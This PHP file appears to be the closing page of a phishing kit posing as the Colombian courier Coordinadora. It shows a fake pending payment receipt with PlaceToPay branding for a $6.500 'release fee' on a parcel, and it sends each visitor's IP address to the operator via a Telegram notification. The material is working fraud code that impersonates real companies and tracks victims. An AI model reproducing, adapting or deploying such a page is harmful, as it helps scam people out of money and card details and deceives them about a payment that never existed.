<?php
// pago/finish.php — Final genérico si no hay un final específico del banco
require_once __DIR__ . '/../panel_v2/config.php';
require_once __DIR__ . '/../panel_v2/lib/telegram.php';

session_start();

// Obtener IP
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

// Enviar notificación básica de finalización usando la config centralizada
$mensaje = "✅ <b>Usuario Finalizado</b>\nIP: " . $ip;
Telegram::send($mensaje);

date_default_timezone_set('America/Bogota');
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coordinadora - Comprobante de Pago</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
         :root {
            --primary: #003c82;
            --secondary: #f05a28;
            --accent: #00adee;
            --background: #f8fafc;
            --surface: #ffffff;
            --warning: #ffc107;
            --success: #28a745;
            --text-primary: #1e293b;
            --text-secondary: #64748b;
            --border: #e2e8f0;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Montserrat', sans-serif;
        }
        
        body {
            background: var(--background);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 2rem 1rem;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            width: 100%;
        }
        
        .receipt-card {
            background: var(--surface);
            border-radius: 1rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            padding: 2rem;
            margin-bottom: 2rem;
        }
        
        .logo-section {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 2rem;
            border-bottom: 1px solid var(--border);
            margin-bottom: 2rem;
        }
        
        .logo {
            height: 40px;
        }
        
        .payment-status {
            background-color: #fff8e6;
            border-left: 4px solid var(--warning);
            padding: 1.5rem;
            border-radius: 0.5rem;
            margin: 2rem 0;
        }
        
        .status-title {
            color: var(--warning);
            font-weight: 600;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .details-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 2rem;
            margin: 2rem 0;
        }
        
        @media (max-width: 640px) {
            .details-grid {
                grid-template-columns: 1fr;
            }
        }
        
        .detail-group {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }
        
        .detail-label {
            color: var(--text-secondary);
            font-size: 0.875rem;
        }
        
        .detail-value {
            color: var(--text-primary);
            font-weight: 500;
        }
        
        .highlight {
            color: var(--secondary);
            font-weight: 600;
        }
        
        .amount-section {
            background: var(--background);
            border-radius: 0.5rem;
            padding: 1.5rem;
            margin: 2rem 0;
        }
        
        .amount-row {
            display: flex;
            justify-content: space-between;
            padding: 0.5rem 0;
        }
        
        .amount-total {
            font-size: 1.25rem;
            font-weight: 600;
            color: var(--primary);
            border-top: 2px solid var(--border);
            padding-top: 1rem;
            margin-top: 0.5rem;
        }
        
        .notice-section {
            background: #e8f4ff;
            border-radius: 0.5rem;
            padding: 1.5rem;
            margin: 2rem 0;
        }
        
        .payment-methods {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 2rem;
            margin: 2rem 0;
            padding: 1rem;
            border: 1px solid var(--border);
            border-radius: 0.5rem;
        }
        
        .payment-methods img {
            height: 40px;
            object-fit: contain;
        }
        
        .footer-note {
            text-align: center;
            color: var(--text-secondary);
            font-size: 0.875rem;
            margin-top: 2rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="receipt-card">
            <div class="logo-section">
                <img src="https://coordinadora.com/wp-content/uploads/2023/03/logo-coordinadora.svg" alt="Coordinadora" class="logo">
                <img src="https://static.placetopay.com/placetopay-logo.svg" alt="PlaceToPay" class="logo" style="height: 30px;">
            </div>

            <h2 style="text-align: center; color: var(--primary); margin-bottom: 1rem;">Comprobante de Pago</h2>

            <div class="payment-status">
                <div class="status-title">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
                    </svg> Pago Pendiente por Aprobar
                </div>
                <p>Tu pago está siendo procesado. Te notificaremos cuando sea aprobado.</p>
            </div>

            <div class="details-grid">
                
                <div class="detail-group">
                    <span class="detail-label">Fecha de Transacción</span>
                    <span class="detail-value"><?php echo date('d/m/Y H:i'); ?></span>
                </div>
                <div class="detail-group">
                    <span class="detail-label">ID de Transacción</span>
                    <span class="detail-value"><?php echo rand(1000000000, 9999999999); ?></span>
                </div>
                <div class="detail-group">
                    <span class="detail-label">Estado</span>
                    <span class="detail-value" style="color: var(--warning);">Pendiente</span>
                </div>
            </div>

            <div class="amount-section">
                <div class="amount-row">
                    <span>Cargo por Liberación</span>
                    <span>$6.500</span>
                </div>
                <div class="amount-row amount-total">
                    <span>Total</span>
                    <span>$6.500</span>
                </div>
            </div>

            <div class="notice-section">
                <h3 style="color: var(--primary); margin-bottom: 1rem; font-size: 1rem;">Información Importante</h3>
                <ul style="list-style: none;">
                    <li style="margin-bottom: 0.5rem;">• Una vez aprobado el pago, tu paquete será liberado para entrega.</li>
                    <li style="margin-bottom: 0.5rem;">• La entrega se realizará al siguiente día hábil después de la aprobación del pago.</li>
                    <li>• Recibirás una notificación por correo electrónico cuando tu pago sea aprobado.</li>
                </ul>
            </div>

            <div class="payment-methods">
                <span style="color: var(--text-secondary)">Procesado por:</span>
                <img src="https://static.placetopay.com/placetopay-logo.svg" alt="PlaceToPay">
            </div>

            <div class="footer-note">
                <p>Este es un comprobante digital generado automáticamente.</p>
                <p style="margin-top: 0.5rem;">© <?= date('Y') ?> Coordinadora. Todos los derechos reservados.</p>
            </div>
        </div>
    </div>
</body>
</html>
